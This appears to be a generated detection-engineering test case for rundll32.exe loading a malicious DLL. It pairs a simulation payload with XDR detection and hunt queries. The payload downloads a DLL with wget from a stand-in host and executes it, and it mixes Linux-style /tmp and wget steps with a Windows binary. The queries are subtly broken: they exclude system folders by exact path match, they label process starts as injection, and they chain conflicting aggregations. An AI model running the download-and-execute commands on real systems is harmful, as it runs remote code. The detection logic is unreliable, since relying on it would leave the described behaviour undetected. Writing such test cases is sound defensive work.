identity.name: Signed Process DLL Injection via Rundll32

identity.description: An attacker uses a legitimate signed process (rundll32.exe) to inject a malicious DLL into a target process, triggering the 'Signed process performed an unpopular DLL injection' alert. Cortex should detect this behavior through process injection telemetry and behavioral anomaly detection.

payload.code:
cd /tmp
wget http://192.0.2.1/malicious.dll -O malicious.dll
stub rundll32.exe
rundll32.exe malicious.dll,EntryPoint

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Signed Process DLL Injection
biocs.description: A signed process such as rundll32.exe performs an uncommon DLL injection into a target process
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name IN ('rundll32.exe', 'msiexec.exe')
| filter action_file_path CONTAINS '.dll'
| filter action_file_path NOT IN ('C:\\Windows\\System32\\', 'C:\\Windows\\SysWOW64\\')

abiocs.name: Unpopular DLL Injection by Signed Process
abiocs.description: Detection of a signed process performing a DLL injection that is not typical for that process
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name IN ('rundll32.exe', 'msiexec.exe')
| filter action_file_path CONTAINS '.dll'
| filter action_file_path NOT IN ('C:\\Windows\\System32\\', 'C:\\Windows\\SysWOW64\\')
| comp count() as events by actor_process_image_name, agent_hostname
| sort desc events

xql_queries.name: Signed Process DLL Injection Hunt
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name IN ('rundll32.exe', 'msiexec.exe')
| filter action_file_path CONTAINS '.dll'
| filter action_file_path NOT IN ('C:\\Windows\\System32\\', 'C:\\Windows\\SysWOW64\\')
| comp count() as cnt by actor_process_image_name, action_file_path
| comp count() as cnt by agent_hostname
